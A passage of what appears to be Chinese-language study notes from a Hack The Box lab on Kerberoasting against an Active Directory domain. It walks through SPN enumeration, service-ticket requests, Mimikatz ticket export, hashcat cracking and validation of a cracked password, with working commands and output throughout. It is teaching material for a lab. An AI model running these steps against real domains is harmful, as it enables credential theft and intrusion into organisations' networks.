f13825764164368e26d58fc55a358ce979865cc57d4f34691b582a3afc18fe718f8b97c44d0b812e5deeed444d665e847c5186ad79ae77a5ed6efab1ed9d863edb36df1a5cd4abdbf7f7e872e3d5fa0bf7735348744d4fc048211c2e7973839962e91db362e5338da59bc0078515a513123d6c5537974707bdc303526437b4a4d3095d1b5e0f2d9db1658ac2444a11b59ddf2761ce4c1e5edd92bcf5cbd8c230cb4328ff2d0e2813b4654116b4fda929a38b69e3f9283e4de7039216f18e85b9ef1a59087581c758efec16d948accc909324e94cad923f2487fb2ed27294329ed314538d0e0e75019d50bcf410c7edab6ce11401adbaf5a3a009ab304d9bdcb0937b4dcab89e90242b7536644677c62fd03741c0b9d090d8fdf0c856c36103aedfd6c58e7064b07628b58c3e086a685f70a1377f53c42ada3cb7bb4ba0a69085dec77f4b7287ca2fb2da9bcbedc39f50586bfc9ec0ac61b687043afa239a46e6b20aacb7d5d8422d5cacc02df18fea3be0c0aa0d83e7982fc225d9e6a2886dc223f6a6830f71dabae21ff38e1722048b5788cd23ee2d6480206df572b6ba2acfe1a5ff6bee8812d585eeb4bc8efce92fd81aa0a9b57f37bf3954c26afc98e15c5c90747948d6008c80b620a1ec54ded2f3073b4b09ee5cc233bf7368427a6af0b1cb1276ebd85b45a30</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>破解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>验证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!</span><br></pre></td></tr></table></figure>

<h2 id="Semi-Manual-From-Windows"><a href="#Semi-Manual-From-Windows" class="headerlink" title="Semi Manual - From Windows"></a>Semi Manual - From Windows</h2><h3 id="setspn-exe"><a href="#setspn-exe" class="headerlink" title="setspn.exe"></a>setspn.exe</h3><p>Windows 内置的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)">setspn</a>二进制文件枚举域中的 SPN。</p>
<p>枚举 SPN</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">setspn.exe</span> -<span class="title">Q</span> */*</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Checking</span> <span class="title">domain</span> <span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01</span>,<span class="title">OU</span>=<span class="title">Domain</span> <span class="title">Controllers</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">exchangeAB</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01</span></span></span><br><span class="line"><span class="function">        <span class="title">exchangeAB</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">TERMSRV</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01</span></span></span><br><span class="line"><span class="function">        <span class="title">TERMSRV</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Dfsr</span>-12<span class="title">F9A27C</span>-<span class="title">BF97</span>-4787-9364-<span class="title">D31B6C55EB04</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">ldap</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span>/<span class="title">ForestDnsZones.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">ldap</span>/<span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01.INLANEFREIGHT.LOCAL</span>/<span class="title">DomainDnsZones.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">BACKUPAGENT</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">backupjob</span>/<span class="title">veam001.inlanefreight.local</span></span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">SOLARWINDSMONITOR</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">sts</span>/<span class="title">inlanefreight.local</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">sqlprod</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">MSSQLSvc</span>/<span class="title">SPSJDB.inlanefreight.local</span>:1433</span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">sqlqa</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">MSSQLSvc</span>/<span class="title">SQL</span>-<span class="title">CL01</span>-01<span class="title">inlanefreight.local</span>:49351</span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">sqldev</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">MSSQLSvc</span>/<span class="title">DEV</span>-<span class="title">PRE</span>-<span class="title">SQL.inlanefreight.local</span>:1433</span></span><br><span class="line"><span class="function"><span class="title">CN</span>=<span class="title">adfs</span>,<span class="title">OU</span>=<span class="title">Service</span> <span class="title">Accounts</span>,<span class="title">OU</span>=<span class="title">Corp</span>,<span class="title">DC</span>=<span class="title">INLANEFREIGHT</span>,<span class="title">DC</span>=<span class="title">LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">adfsconnect</span>/<span class="title">azure01.inlanefreight.local</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Existing</span> <span class="title">SPN</span> <span class="title">found</span>!</span></span><br></pre></td></tr></table></figure>

<p>为上述 shell 中的帐户请求 TGS 票证并将其加载到内存中。一旦将它们加载到内存中，就可以使用<code>Mimikatz</code>提取它们。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; setspn.exe <span class="literal">-T</span> INLANEFREIGHT.LOCAL <span class="literal">-Q</span> */* | <span class="built_in">Select-String</span> <span class="string">&#x27;^CN&#x27;</span> <span class="literal">-Context</span> <span class="number">0</span>,<span class="number">1</span> | % &#123; <span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="variable">$_</span>.Context.PostContext[<span class="number">0</span>].Trim() &#125;</span><br></pre></td></tr></table></figure>

<h3 id="System-IdentityModel"><a href="#System-IdentityModel" class="headerlink" title="System.IdentityModel"></a>System.IdentityModel</h3><p>针对单个帐户请求 TGS 票证并将其加载到内存中。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">&quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</span></span><br><span class="line"></span><br><span class="line">Id                   : uuid<span class="literal">-67a2100c-150f-477c-a28a-19f6cfed4e90-2</span></span><br><span class="line">SecurityKeys         : &#123;System.IdentityModel.Tokens.InMemorySymmetricSecurityKey&#125;</span><br><span class="line">ValidFrom            : <span class="number">2</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">36</span>:<span class="number">22</span> PM</span><br><span class="line">ValidTo              : <span class="number">2</span>/<span class="number">25</span>/<span class="number">2022</span> <span class="number">8</span>:<span class="number">55</span>:<span class="number">25</span> AM</span><br><span class="line">ServicePrincipalName : MSSQLSvc/DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local:<span class="number">1433</span></span><br><span class="line">SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey</span><br></pre></td></tr></table></figure>

<p>分解上面的命令来看看在做什么（这基本上是<a target="_blank" rel="noopener" href="https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1">Rubeus</a>在使用默认的 Kerberoasting 方法时所使用的）</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2">Add-Type</a> cmdlet用于将 .NET 框架类添加到 PowerShell 会话中，然后可以像任何 .NET 框架对象一样实例化该类</li>
<li><code>-AssemblyName</code>参数允许指定一个包含感兴趣的类型的程序集</li>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8">System.IdentityModel</a>是一个命名空间，包含用于构建安全令牌服务的不同类</li>
<li>然后，将使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2">New-Object</a> cmdlet 创建 .NET Framework 对象的实例</li>
<li>将使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8">System.IdentityModel.Tokens</a>命名空间和<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8">KerberosRequestorSecurityToken</a>类来创建安全令牌，并将 SPN 名称传递给该类，以便在当前登录会话中为目标帐户请求 Kerberos TGS 票证</li>
</ul>
<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><p><code>setspn.exe</code>为所有设置了 SPN 的账户请求票证。现在票证已加载，可以使用<code>Mimikatz</code>从中提取票证<code>memory</code>。</p>
<p>如果不指定<code>base64 /out:true</code>命令，Mimikatz 将提取票证并将其写入<code>.kirbi</code>文件。在无法轻松的移动文件的情况下是好的选择。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Using &#x27;mimikatz.log&#x27; for logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz # base64 /out:true</span><br><span class="line">isBase64InterceptInput  is false</span><br><span class="line">isBase64InterceptOutput is true</span><br><span class="line"></span><br><span class="line">mimikatz # kerberos::list /export  </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[00000002] - 0x00000017 - rc4_hmac_nt      </span><br><span class="line">   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM</span><br><span class="line">   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL</span><br><span class="line">   Client Name       : htb-student @ INLANEFREIGHT.LOCAL</span><br><span class="line">   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; </span><br><span class="line">====================</span><br><span class="line">Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi</span><br><span class="line">====================</span><br><span class="line">doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO</span><br><span class="line">RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T</span><br><span class="line">UUwuaW5sYW5lZnJlaWdodC5sb2NhbDoxNDMzo4IEvzCCBLugAwIBF6EDAgECooIE</span><br><span class="line">rQSCBKmBMUn7JhVJpqG0ll7UnRuoeoyRtHxTS8JY1cl6z0M4QbLvJHi0JYZdx1w5</span><br><span class="line">sdzn9Q3tzCn8ipeu+NUaIsVyDuYU/LZG4o2FS83CyLNiu/r2Lc2ZM8Ve/rqdd+TG</span><br><span class="line">xvUkr+5caNrPy2YHKRogzfsO8UQFU1anKW4ztEB1S+f4d1SsLkhYNI4q67cnCy00</span><br><span class="line">UEf4gOF6zAfieo91LDcryDpi1UII0SKIiT0yr9IQGR3TssVnl70acuNac6eCC+Uf</span><br><span class="line">vyd7g9gYH/9aBc8hSBp7RizrAcN2HFCVJontEJmCfBfCk0Ex23G8UULFic1w7S6/</span><br><span class="line">V9yj9iJvOyGElSk1VBRDMhC41712/sTraKRd7rw+fMkx7YdpMoU2dpEj9QQNZ3GR</span><br><span class="line">XNvGyQFkZp+sctI6Yx/vJYBLXI7DloCkzClZkp7c40u+5q/xNby7smpBpLToi5No</span><br><span class="line">ltRmKshJ9W19aAcb4TnPTfr2ZJcBUpf5tEza7wlsjQAlXsPmL3EF2QXQsvOc74Pb</span><br><span class="line">TYEnGPlejJkSnzIHs4a0wy99V779QR4ZwhgUjRkCjrAQPWvpmuI6RU9vOwM50A0n</span><br><span class="line">h580JZiTdZbK2tBorD2BWVKgU/h9h7JYR4S52DBQ7qmnxkdM3ibJD0o1RgdqQO03</span><br><span class="line">TQBMRl9lRiNJnKFOnBFTgBLPAN7jFeLtREKTgiUC1/aFAi5h81aOHbJbXP5aibM4</span><br><span class="line">eLbj2wXp2RrWOCD8t9BEnmat0T8e/O3dqVM52z3JGfHK/5aQ5Us+T5qM9pmKn5v1</span><br><span class="line">XHou0shzgunaYPfKPCLgjMNZ8+9vRgOlry/CgwO/NgKrm8UgJuWMJ/skf9QhD0Uk</span><br><span class="line">T9cUhGhbg3/pVzpTlk1UrP3n+WMCh2Tpm+p7dxOctlEyjoYuQ9iUY4KI6s6ZttT4</span><br><span class="line">tmhBUNua3EMlQUO3fzLr5vvjCd3jt4MF/fD+YFBfkAC4nGfHXvbdQl4E++Ol6/LX</span><br><span class="line">ihGjktgVop70jZRX+2x4DrTMB9+mjC6XBUeIlS9a2Syo0GLkpolnhgMC/ZYwF0r4</span><br><span class="line">MuWZu1/KnPNB16EXaGjZBzeW3/vUjv6ZsiL0J06TBm3mRrPGDR3ZQHLdEh3QcGAk</span><br><span class="line">0Rc4p16+tbeGWlUFIg0PA66m01mhfzxbZCSYmzG25S0cVYOTqjToEgT7EHN0qIhN</span><br><span class="line">yxb2xZp2oAIgBP2SFzS4cZ6GlLoNf4frRvVgevTrHGgba1FA28lKnqf122rkxx+8</span><br><span class="line">ECSiW3esAL3FSdZjc9OQZDvo8QB5MKQSTpnU/LYXfb1WafsGFw07inXbmSgWS1Xk</span><br><span class="line">VNCOd/kXsd0uZI2cfrDLK4yg7/ikTR6l/dZ+Adp5BHpKFAb3YfXjtpRM6+1FN56h</span><br><span class="line">TnoCfIQ/pAXAfIOFohAvB5Z6fLSIP0TuctSqejiycB53N0AWoBGT9bF4409M8tjq</span><br><span class="line">32UeFiVp60IcdOjV4Mwan6tYpLm2O6uwnvw0J+Fmf5x3Mbyr42RZhgQKcwaSTfXm</span><br><span class="line">5oZV57Di6I584CgeD1VN6C2d5sTZyNKjb85lu7M3pBUDDOHQPAD9l4Ovtd8O6Pur</span><br><span class="line">+jWFIa2EXm0H/efTTyMR665uahGdYNiZRnpm+ZfCc9LfczUPLWxUOOcaBX/uq6OC</span><br><span class="line">AQEwgf6gAwIBAKKB9gSB832B8DCB7aCB6jCB5zCB5KAbMBmgAwIBF6ESBBB3DAVi</span><br><span class="line">Ys6KmIFpubCAqyQcoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiGDAWoAMCAQGhDzAN</span><br><span class="line">GwtodGItc3R1ZGVudKMHAwUAQKEAAKURGA8yMDIyMDIyNDIzMzYyMlqmERgPMjAy</span><br><span class="line">MjAyMjUwODU1MjVapxEYDzIwMjIwMzAzMjI1NTI1WqgVGxNJTkxBTkVGUkVJR0hU</span><br><span class="line">LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu</span><br><span class="line">ZWZyZWlnaHQubG9jYWw6MTQzMw==</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>去除换行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\n </span><br><span class="line"></span><br><span class="line">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</span><br></pre></td></tr></table></figure>

<p>使用<code>base64</code>解码并转换回<code>.kirbi</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat encoded_file | base64 -d &gt; sqldev.kirbi</span><br></pre></td></tr></table></figure>

<p>提取 Kerberos 票证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kirbi2john.py sqldev.kirbi</span><br></pre></td></tr></table></figure>

<p>破解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<h2 id="Automated-Tool-Based-Route"><a href="#Automated-Tool-Based-Route" class="headerlink" title="Automated &#x2F; Tool Based Route"></a>Automated &#x2F; Tool Based Route</h2><h3 id="PowerView-1"><a href="#PowerView-1" class="headerlink" title="PowerView"></a>PowerView</h3><h4 id="enum-3"><a href="#enum-3" class="headerlink" title="enum"></a>enum</h4><p>枚举 samaccountname</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> * <span class="literal">-spn</span> | <span class="built_in">select</span> samaccountname</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">adfs</span><br><span class="line">backupagent</span><br><span class="line">krbtgt</span><br><span class="line">sqldev</span><br><span class="line">sqlprod</span><br><span class="line">sqlqa</span><br><span class="line">solarwindsmonitor</span><br></pre></td></tr></table></figure>

<h4 id="ticket"><a href="#ticket" class="headerlink" title="ticket"></a>ticket</h4><p>将所有票证导出到 CSV 文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> * <span class="literal">-SPN</span> | <span class="built_in">Get-DomainSPNTicket</span> <span class="literal">-Format</span> Hashcat | <span class="built_in">Export-Csv</span> .\ilfreight_tgs.csv <span class="literal">-NoTypeInformation</span></span><br></pre></td></tr></table></figure>

<p>针对特定用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> sqldev | <span class="built_in">Get-DomainSPNTicket</span> <span class="literal">-Format</span> Hashcat</span><br></pre></td></tr></table></figure>

<h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h3><p>GhostPack 中的<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a>更快、更轻松地执行 Kerberoasting。</p>
<ul>
<li>执行 Kerberoasting 并将哈希输出到文件</li>
<li>使用备用凭证</li>
<li>执行 Kerberoasting 与传递票证攻击相结合</li>
<li>执行 “opsec” Kerberoasting 以过滤掉启用 AES 的账户</li>
<li>请求在特定日期范围内设置的账户密码的票证</li>
<li>限制请求的票数</li>
<li>执行 AES Kerberoast 攻击</li>
</ul>
<p><code>/stats</code> 显示服务主体（SPNs）相关的统计信息。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /stats</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span 